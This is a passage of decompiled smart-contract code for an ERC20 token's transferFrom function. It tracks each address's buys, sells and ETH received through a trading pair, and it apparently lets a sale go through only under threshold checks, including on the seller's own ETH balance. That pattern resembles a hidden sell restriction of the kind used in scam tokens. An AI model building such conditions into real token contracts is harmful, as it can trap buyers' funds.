                                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                            gas gas_remaining wei
                                                           args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                                else:
                                                    staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                            gas gas_remaining wei
                                                           args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                                if not ext_call.success:
                                                    revert with ext_call.return_data[0 len return_data.size]
                                                require return_data.size >= 32
                                                require ext_call.return_data[0] == ext_call.return_data[0]
                                                if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                                    revert with 'NH{q', 17
                                                stor9[address(arg1)] += ext_call.return_data[0]
                                            else:
                                                if arg2 == stor2:
                                                    if stor8[address(arg1)] > -arg3 - 1:
                                                        revert with 'NH{q', 17
                                                    stor8[address(arg1)] += arg3
                                                    require ext_code.size(stor2)
                                                    staticcall stor2.getReserves() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 96
                                                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                                    require ext_code.size(stor1)
                                                    staticcall stor1.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor2)
                                                    staticcall stor2.token0() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor1)
                                                    if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                gas gas_remaining wei
                                                               args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                                    else:
                                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                gas gas_remaining wei
                                                               args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[0]
                                                    if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                                        revert with 'NH{q', 17
                                                    stor9[address(arg1)] += ext_call.return_data[0]
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 0, 'ERC20: transfer amount exceeds balance'
                                    if balanceOf[address(arg1)] < arg3:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] -= arg3
                                    if balanceOf[address(arg2)] > -arg3 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg2)] += arg3
                                    emit Transfer(arg3, arg1, arg2);
                                    if allowance[address(arg1)][address(msg.sender)] < arg3:
                                        revert with 'NH{q', 17
                                    if not arg1:
                                        revert with 0, 'ERC20: approve from the zero address'
                                    if not msg.sender:
                                        revert with 0, 'ERC20: approve to the zero address'
                                    allowance[address(arg1)][address(msg.sender)] -= arg3
                                    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                    else:
                        if arg2 != stor2:
                            if allowance[address(arg1)][address(msg.sender)] < arg3:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer amount exceeds allowance'
                            if not arg1:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer from the zero address'
                            if not arg2:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'ERC20: transfer to the zero address'
                            require ext_code.size(stor2)
                            staticcall stor2.getReserves() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 96
                            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                            if ext_call.return_data[18 len 14] > 0:
                                if ext_call.return_data[50 len 14] > 0:
                                    if arg1 == stor1:
                                        if stor7[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        stor7[address(arg2)] += arg3
                                    else:
                                        if arg1 == stor2:
                                            if stor7[address(arg2)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            stor7[address(arg2)] += arg3
                                    if arg2 == stor1:
                                        if stor8[address(arg1)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        stor8[address(arg1)] += arg3
                                        require ext_code.size(stor2)
                                        staticcall stor2.getReserves() with:
                                                gas gas_remaining wei
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 96
                                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                        require ext_code.size(stor1)
                                        staticcall stor1.WETH() with:
                                                gas gas_remaining wei
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        require ext_code.size(stor2)
                                        staticcall stor2.token0() with:
                                                gas gas_remaining wei
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                        require ext_code.size(stor1)
                                        if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                    gas gas_remaining wei
                                                   args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                        else:
                                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                    gas gas_remaining wei
                                                   args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 32
                                        require ext_call.return_data[0] == ext_call.return_data[0]
                                        if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                            revert with 'NH{q', 17
                                        stor9[address(arg1)] += ext_call.return_data[0]
                                    else:
                                        if arg2 == stor2:
                                            if stor8[address(arg1)] > -arg3 - 1:
                                                revert with 'NH{q', 17
                                            stor8[address(arg1)] += arg3
                                            require ext_code.size(stor2)
                                            staticcall stor2.getReserves() with:
                                                    gas gas_remaining wei
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 96
                                            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                            require ext_code.size(stor1)
                                            staticcall stor1.WETH() with:
                                                    gas gas_remaining wei
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            require ext_code.size(stor2)
                                            staticcall stor2.token0() with:
                                                    gas gas_remaining wei
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                            require ext_code.size(stor1)
                                            if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                        gas gas_remaining wei
                                                       args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                            else:
                                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                        gas gas_remaining wei
                                                       args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                            if not ext_call.success:
                                                revert with ext_call.return_data[0 len return_data.size]
                                            require return_data.size >= 32
                                            require ext_call.return_data[0] == ext_call.return_data[0]
                                            if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                                revert with 'NH{q', 17
                                            stor9[address(arg1)] += ext_call.return_data[0]
                            if balanceOf[address(arg1)] < arg3:
                                revert with 0, 'ERC20: transfer amount exceeds balance'
                            if balanceOf[address(arg1)] < arg3:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] -= arg3
                            if balanceOf[address(arg2)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg2)] += arg3
                            emit Transfer(arg3, arg1, arg2);
                            if allowance[address(arg1)][address(msg.sender)] < arg3:
                                revert with 'NH{q', 17
                            if not arg1:
                                revert with 0, 'ERC20: approve from the zero address'
                            if not msg.sender:
                                revert with 0, 'ERC20: approve to the zero address'
                            allowance[address(arg1)][address(msg.sender)] -= arg3
                            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                        else:
                            require ext_code.size(stor2)
                            staticcall stor2.getReserves() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 96
                            require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                            require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                            require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                            require ext_code.size(stor1)
                            staticcall stor1.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor2)
                            staticcall stor2.token0() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor1)
                            if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                            else:
                                staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                        gas gas_remaining wei
                                       args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[0]
                            if stor8[address(arg1)] > -arg3 - 1:
                                revert with 'NH{q', 17
                            if stor7[address(arg1)] >= stor8[address(arg1)] + arg3:
                                if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                    revert with 'NH{q', 17
                                if stor11 >= stor9[address(arg1)] + ext_call.return_data[0]:
                                    if eth.balance(arg1) >= stor12:
                                        if allowance[address(arg1)][address(msg.sender)] < arg3:
                                            revert with 0, 'ERC20: transfer amount exceeds allowance'
                                        if not arg1:
                                            revert with 0, 'ERC20: transfer from the zero address'
                                        if not arg2:
                                            revert with 0, 'ERC20: transfer to the zero address'
                                        require ext_code.size(stor2)
                                        staticcall stor2.getReserves() with:
                                                gas gas_remaining wei
                                        if not ext_call.success:
                                            revert with ext_call.return_data[0 len return_data.size]
                                        require return_data.size >= 96
                                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                        if ext_call.return_data[18 len 14] > 0:
                                            if ext_call.return_data[50 len 14] > 0:
                                                if arg1 == stor1:
                                                    if stor7[address(arg2)] > -arg3 - 1:
                                                        revert with 'NH{q', 17
                                                    stor7[address(arg2)] += arg3
                                                else:
                                                    if arg1 == stor2:
                                                        if stor7[address(arg2)] > -arg3 - 1:
                                                            revert with 'NH{q', 17
                                                        stor7[address(arg2)] += arg3
                                                if arg2 == stor1:
                                                    if stor8[address(arg1)] > -arg3 - 1:
                                                        revert with 'NH{q', 17
                                                    stor8[address(arg1)] += arg3
                                                    require ext_code.size(stor2)
                                                    staticcall stor2.getReserves() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 96
                                                    require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                                    require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                                    require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                                    require ext_code.size(stor1)
                                                    staticcall stor1.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor2)
                                                    staticcall stor2.token0() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor1)
                                                    if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                gas gas_remaining wei
                                                               args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                                    else:
                                                        staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                gas gas_remaining wei
                                                               args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[0]
                                                    if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                                        revert with 'NH{q', 17
                                                    stor9[address(arg1)] += ext_call.return_data[0]
                                                else:
                                                    if arg2 == stor2:
                                                        if stor8[address(arg1)] > -arg3 - 1:
                                                            revert with 'NH{q', 17
                                                        stor8[address(arg1)] += arg3
                                                        require ext_code.size(stor2)
                                                        staticcall stor2.getReserves() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 96
                                                        require ext_call.return_data[0] == ext_call.return_data[18 len 14]
                                                        require ext_call.return_data[32] == ext_call.return_data[50 len 14]
                                                        require ext_call.return_data[64] == ext_call.return_data[92 len 4]
                                                        require ext_code.size(stor1)
                                                        staticcall stor1.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor2)
                                                        staticcall stor2.token0() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor1)
                                                        if ext_call.return_data[12 len 20] != address(ext_call.return_data[0]):
                                                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                    gas gas_remaining wei
                                                                   args arg3, ext_call.return_data[0] << 144, Mask(112, 0, ext_call.return_data[32])
                                                        else:
                                                            staticcall stor1.getAmountOut(uint256 arg1, uint256 arg2, uint256 arg3) with:
                                                                    gas gas_remaining wei
                                                                   args arg3, ext_call.return_data[32] << 144, Mask(112, 0, ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[0]
                                                        if stor9[address(arg1)] > -ext_call.return_data[0] - 1:
                                                            revert with 'NH{q', 17
                                                        stor9[address(arg1)] += ext_call.return_data[0]
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 0, 'ERC20: transfer amount exceeds balance'
                                        if balanceOf[address(arg1)] < arg3:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] -= arg3
                                        if balanceOf[address(arg2)] > -arg3 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg2)] += arg3
                                        emit Transfer(arg3, arg1, arg2);
                                        if allowance[address(arg1)][address(msg.sender)] < arg3:
                                            revert with 'NH{q', 17
                                        if not arg1:
                                            revert with 0, 'ERC20: approve from the zero address'
                                        if not msg.sender:
                                            revert with 0, 'ERC20: approve to the zero address'
                                        allowance[address(arg1)][address(msg.sender)] -= arg3
                                        emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
